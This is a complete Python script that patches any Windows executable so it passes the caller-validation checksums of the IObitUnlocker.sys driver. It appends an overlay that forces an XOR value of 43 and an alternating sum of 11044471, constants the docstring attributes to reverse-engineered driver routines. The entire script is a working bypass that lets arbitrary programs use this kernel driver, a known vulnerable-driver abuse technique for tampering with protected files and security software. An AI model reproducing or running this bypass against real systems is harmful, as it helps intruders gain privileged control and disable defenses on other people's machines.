#!/usr/bin/env python3
"""
patch_checksum.py - Patch a PE binary so it passes the IObitUnlocker.sys
caller validation checksums.

The driver's sub_140005B18 -> sub_140003994 reads the calling process's
EXE and computes:
  checksum1 (XOR):  XOR of every byte in the file
  checksum2 (ALT):  alternating add/subtract across all bytes
                    (even index -> add, odd index -> subtract)

The driver requires:  checksum1 == 43,  checksum2 == 11044471

This script appends a PE overlay (bytes past the end of the last section)
that adjusts both checksums to the target values. The overlay does not
affect PE loading or execution. The driver accepts files up to 3 MB.

Usage:  python3 patch_checksum.py <binary.exe>
"""

import sys

TARGET_XOR = 43
TARGET_ALT = 11044471
MAX_FILE_SIZE = 3 * 1024 * 1024


def compute_checksums(data):
    xor_sum = 0
    alt_sum = 0
    for i, b in enumerate(data):
        xor_sum ^= b
        if i % 2 == 0:
            alt_sum += b
        else:
            alt_sum -= b
    return xor_sum, alt_sum


def try_solve_final(xor_need, diff_need):
    """Find b0, b1 in [0..255] such that b0^b1 == xor_need and b0-b1 == diff_need."""
    for b0 in range(256):
        b1 = b0 ^ xor_need
        if 0 <= b1 <= 255 and b0 - b1 == diff_need:
            return b0, b1
    return None


def build_patch(data):
    n = len(data)
    xor_cur, alt_cur = compute_checksums(data)
    delta_alt = TARGET_ALT - alt_cur

    # Each (hi, lo) pair appended contributes to ALT based on parity of
    # the position where the pair starts.
    # Position even: pair (a,b) -> ALT += a - b,  XOR ^= a ^ b
    # Position odd:  pair (a,b) -> ALT += -a + b,  XOR ^= a ^ b
    #
    # Use (0xFF, 0x00) pairs: each contributes +-255 to ALT and 0xFF to XOR.
    # XOR of an even number of such pairs cancels out.

    # Build bulk fill to get ALT close to target
    if delta_alt == 0:
        bulk_pairs = 0
    else:
        # Each pair moves ALT by +-255 depending on direction and parity
        bulk_pairs = abs(delta_alt) // 255

    # Try several pair counts around the estimate, with 0-3 extra pad bytes,
    # to find a combination where the final 2-byte correction is solvable.
    for pair_adjust in range(-2, 4):
        np = max(0, bulk_pairs + pair_adjust)
        patch = bytearray()

        for i in range(np):
            pos = n + 2 * i
            if pos % 2 == 0:
                if delta_alt >= 0:
                    patch.extend(b'\xff\x00')
                else:
                    patch.extend(b'\x00\xff')
            else:
                if delta_alt >= 0:
                    patch.extend(b'\x00\xff')
                else:
                    patch.extend(b'\xff\x00')

        # Try with 0-3 zero-byte padding before the final correction pair
        for extra_pad in range(4):
            test = bytes(data) + bytes(patch) + b'\x00' * extra_pad
            xm, am = compute_checksums(test)
            m = len(test)

            xor_need = xm ^ TARGET_XOR
            remaining = TARGET_ALT - am

            if m % 2 == 0:
                diff_need = remaining
            else:
                diff_need = -remaining

            result = try_solve_final(xor_need, diff_need)
            if result is not None:
                b0, b1 = result
                final_patch = bytes(patch) + b'\x00' * extra_pad + bytes([b0, b1])
                return final_patch

    # Fallback: brute-force extra padding byte values
    for pair_adjust in range(-2, 4):
        np = max(0, bulk_pairs + pair_adjust)
        patch = bytearray()

        for i in range(np):
            pos = n + 2 * i
            if pos % 2 == 0:
                if delta_alt >= 0:
                    patch.extend(b'\xff\x00')
                else:
                    patch.extend(b'\x00\xff')
            else:
                if delta_alt >= 0:
                    patch.extend(b'\x00\xff')
                else:
                    patch.extend(b'\xff\x00')

        for pad_val in range(256):
            test = bytes(data) + bytes(patch) + bytes([pad_val])
            xm, am = compute_checksums(test)
            m = len(test)

            xor_need = xm ^ TARGET_XOR
            remaining = TARGET_ALT - am
            diff_need = remaining if m % 2 == 0 else -remaining

            result = try_solve_final(xor_need, diff_need)
            if result is not None:
                b0, b1 = result
                final_patch = bytes(patch) + bytes([pad_val, b0, b1])
                return final_patch

    print("[-] ERROR: exhausted search space.")
    sys.exit(1)


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <binary.exe>")
        sys.exit(1)

    path = sys.argv[1]
    with open(path, "rb") as f:
        data = bytearray(f.read())

    xor_cur, alt_cur = compute_checksums(data)
    print(f"[*] File size     : {len(data)} bytes")
    print(f"[*] Current XOR   : {xor_cur} (target: {TARGET_XOR})")
    print(f"[*] Current ALT   : {alt_cur} (target: {TARGET_ALT})")

    if xor_cur == TARGET_XOR and alt_cur == TARGET_ALT:
        print("[+] Checksums already match, no patching needed.")
        return

    patch = build_patch(data)
    patched = data + patch

    if len(patched) > MAX_FILE_SIZE:
        print(f"[-] Patched file would be {len(patched)} bytes, exceeding "
              f"driver's 3 MB limit.")
        sys.exit(1)

    xor_new, alt_new = compute_checksums(patched)
    assert xor_new == TARGET_XOR, f"XOR mismatch: {xor_new} != {TARGET_XOR}"
    assert alt_new == TARGET_ALT, f"ALT mismatch: {alt_new} != {TARGET_ALT}"

    with open(path, "wb") as f:
        f.write(patched)

    print(f"[+] Appended {len(patch)} byte overlay")
    print(f"[+] New XOR       : {xor_new}")
    print(f"[+] New ALT       : {alt_new}")
    print(f"[+] Patched file  : {path} ({len(patched)} bytes)")


if __name__ == "__main__":
    main()
